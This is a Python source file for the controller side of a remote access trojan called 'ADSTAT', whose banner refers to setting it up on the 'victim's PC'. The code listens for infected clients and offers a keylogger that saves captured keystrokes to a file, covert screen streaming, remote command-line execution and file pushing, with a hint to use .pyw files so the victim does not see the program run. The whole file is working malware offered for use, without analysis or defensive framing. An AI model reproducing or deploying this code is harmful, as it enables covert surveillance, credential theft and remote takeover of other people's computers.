try:
    import socket
    import os
    import time
    import threading
    import keyboard
    import cv2
    import numpy 
    import subprocess
except:
    import subprocess
    module = ['socket', 'os', 'time', 'keyboard', 'opencv', 'numpy', 'zlib']
    num = 0
    while num < 6:
        subprocess.run('python -m pip install {module}'.format(module=module[num]))
        num += 1
class server:
    def __init__(self,port):
        self.ip = str(socket.gethostbyname(socket.gethostname()))
        self.port = port
        self.bufferSize = 10240000

    def start(self):
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.bind(('0.0.0.0' , self.port))
         s.listen(10)  
         while True:
               print('[PROGRAM] Waiting for connection.')
               addr, client = s.accept()
               self.addr = addr
               print('[PROGRAM] Client connected.')
               addr.sendall('hi'.encode())
               self.clientip = addr.recv(1024).decode()
               print('[PROGRAM] Client IP address:'+ self.clientip )
               while True:
                   self.command()

    def command(self):
        helpmessage = '''
============================================================
[PROGRAM] Type command to execute:
        -f FILESENDER: Sending file
        -ip: Get client's IP address
        -k KEYLOGGER: Keylogging client
        -s SSA: Screen Sharing Application - share client's screen 
        -b CMD: Window default command line interpreter application - Use it to startup cmd from client
        -help Get help message
============================================================
                        ''' 
        print(helpmessage)
        addr = self.addr
        response = input('Enter command:')
        if response == 'f' or response == 'F':
            try:
                addr.sendall('f'.encode())
            except:
                print('[ERROR] Client disconnected')
                self.start()
            file = input('[FILE SENDER] Enter file you want to send:')
            if os.path.exists(file):
                if 'py' in file.split('.'):
                    print('[WARNING] File is not pyw, client may see program executed. Are you sure you want to send this file?')
                    s = input('[Y, N]')
                    if s == 'y':
                        addr.sendall(file.encode())
                        f = open(file,'rb')
                        data = f.read(102400)
                        addr.sendall(data)
                    
                    self.command()
                else:
                    print('[FILE SENDER] sending file...')
                    addr.sendall(file.encode())
                    f = open(file,'rb')
                    data = f.read(102400)
                    addr.sendall(data)
            else:
                print("[Error] file doesn't exist")
                self.command()
        elif response == 'ip'  or response == 'IP':
            print('[PROGRAM] Client IP:' + self.clientip)
            self.command()
        elif response == 'help':
            print(helpmessage)
            self.command()
        elif response == 'k'  or response == 'K':
            try:
                addr.sendall('k'.encode())
                keylogger = threading.Thread(target=self.keylogger,)
                keylogger.start()
                while True:
                    if keyboard.read_key() == 'x':
                        print('[KEYLOGGER] Keylogger Stoped')
                        self.addr.send('stop'.encode())
                        keylogger.join()
                        self.command()

            except:
                print('[ERROR] Client disconnected')
                self.start()

        elif response == 's'  or response == 'S':
            try:
                addr.sendall('s'.encode())
                self.SSA()
            except:
                print("[ERROR] Client disconnected")
                self.start()

        elif response == 'b':
            try:
                addr.send('b'.encode())
            except:
                print("[ERROR] Client disconnected")
                self.start()
            print("[CMD] Access Client's CMD ")
            print('[CMD] Enter [QUIT] to quit CMD ')
            subprocess.run('help')
            while True:
                command = input('')
                if command == 'quit':
                    print('[CMD] Closing CMD from client')
                    addr.send('quit'.encode())
                    self.command()
                else:
                    try:
                        addr.send(command.encode())
                        while True:
                            result = addr.recv(10240).decode()
                            if result == 'bug':
                                print('Command you entered is not recognized as an internal or external command')
                            else:
                                print(result)
                            break
                    except:
                        print("[ERROR] Client disconnected")
                        self.start()
        else:
            print('[Error] unknown command')
            self.command()
    def keylogger(self):
        addr = self.addr
        print("[KEYLOGGER] Data will be sent to text file every 10 seconds, press X to stop")
        print("[KEYLOGGER] Capturing client's keyboard input")
        while True: 
            try:
                key = addr.recv(1024).decode()
                if len(key) == 40:
                    print('close')
                    break
                elif len(key) == 0:
                    print('[ERROR] Client disconnected')
                    self.start()
                else:
                    print('[KEYLOGGER] Data received')
                    with open('keyloggerdata.txt', 'a') as ff:
                        ff.write(key + '\n ')
                        ff.close()
            except:
                print('unsucess')

    def SSA(self):
        addr = self.addr
        print('[SSA] Screen sharing started')
        print('[SSA] Press Q to pause')
        time.sleep(1)
        oldtime = time.time()
        while True:
            try:
                size_len = int(addr.recv(1).decode())
                print(size_len)
                size = int(addr.recv(size_len).decode())
                img = self.recvall(size)
                timetaken = time.time() - oldtime
                print('received. Time taken:{timetaken}'.format(timetaken = timetaken) )
                oldtime = time.time()
                addr.send('recved'.encode())
                z = numpy.frombuffer(img, dtype=numpy.uint8)
                img2 = cv2.imdecode(z, cv2.IMREAD_COLOR)
                img2 = cv2.resize(img2,(800, 500))
                cv2.imshow('img', img2)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    cv2.destroyAllWindows()
                    print('[SSA] Paused')
                    x = input('[SSA] Press E to continue/ Press Q to leave')
                    if x == 'E' or x == 'e':
                        addr.send('continue'.encode())
                        pass
                    else:
                        print('[SSA] SSA stopped')
                        addr.send('quit'.encode())
                        while True:
                            data = addr.recv(1024000)
                            self.command()
            except:
                print('[ERROR] Client disconnected')
                self.start()
    def recvall(self, length):
        addr = self.addr
        buf = b''
        while len(buf) < length:
            data = addr.recv(length - len(buf))
            print(length - len(buf))
            if not data:
                return data
            buf += data
        return buf

    def run(self):
        print('''
============================================================
                      ADSTAT SERVER 
[ADSTAT] WELCOME TO ADSTAT'S SERVER 
[ADSTAT] MAKE SURE YOU HAVE SETTED UP ADSTAT APPLICATION TO VICTIM'S PC
[PROGRAM] Your IP address is:{ip} '''.format(ip=self.ip))
        num = 0  
        input('[PROGRAM] Press Enter to continue...')



if __name__ == '__main__':
    s = server(8080)
    s.run()
    s.start()

    

